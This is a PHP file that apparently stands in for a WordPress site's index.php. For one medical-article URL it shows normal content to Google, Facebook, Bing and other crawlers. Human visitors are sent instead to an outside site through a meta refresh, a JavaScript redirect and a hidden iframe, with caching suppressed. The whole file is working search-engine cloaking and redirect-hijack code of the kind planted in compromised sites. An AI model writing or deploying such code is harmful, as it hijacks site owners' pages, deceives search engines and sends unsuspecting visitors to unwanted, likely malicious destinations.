<?php
/**
 * CLOAKING SUPER BRUTAL - Anti Waff
 * Kombinasi PHP + Meta Refresh + JavaScript
 */

// ============ TARGET URL ============
$target_path = '/books/stanbilisasi-hemodinamik-pasien-dengan-penyakit-jantung-koroner-dengan-posisi-semi-fowler-lateral-kanan/';
$cloak_url = 'https://pessawat.site/rezekigakkemana/';

// ============ CEK URL ============
$current_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$current_path = strtok($current_uri, '?');

// ============ CEK BOT ============
function is_bot() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $bots = [
        'Googlebot', 'Google-Site-Verification', 'Google-InspectionTool',
        'Googlebot-Mobile', 'Googlebot-News', 'AdsBot-Google',
        'Mediapartners-Google', 'GoogleProducer', 'facebookexternalhit',
        'Twitterbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot'
    ];
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) return true;
    }
    return false;
}

// ============ EKSEKUSI CLOAKING ============
if ($current_path == $target_path && !is_bot()) {
    
    // HAPUS SEMUA CACHE DENGAN HEADER
    header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
    header('Content-Type: text/html; charset=utf-8');
    
    // METHOD 1: META REFRESH (Paling ampuh)
    echo '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
        <meta http-equiv="pragma" content="no-cache">
        <meta http-equiv="expires" content="0">
        <meta http-equiv="refresh" content="0; url=' . $cloak_url . '">
        <title>Redirecting...</title>
        <style>
            body { 
                margin: 0; 
                padding: 0; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                background: #f5f5f5;
                font-family: Arial, sans-serif;
            }
            .loader {
                text-align: center;
            }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #3498db;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="loader">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
        
        <!-- METHOD 2: JAVASCRIPT REDIRECT (Backup) -->
        <script>
            // Hapus semua cache
            if (window.performance) {
                window.performance.mark("redirect_start");
            }
            
            // Redirect dengan JavaScript
            window.location.replace("' . $cloak_url . '");
            
            // Backup redirect
            setTimeout(function() {
                window.location.href = "' . $cloak_url . '";
            }, 100);
        </script>
        
        <!-- METHOD 3: IFRAME (Super Backup) -->
        <iframe src="' . $cloak_url . '" style="display:none;"></iframe>
    </body>
    </html>';
    exit;
}

// ============ LOAD WORDPRESS ============
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
?>
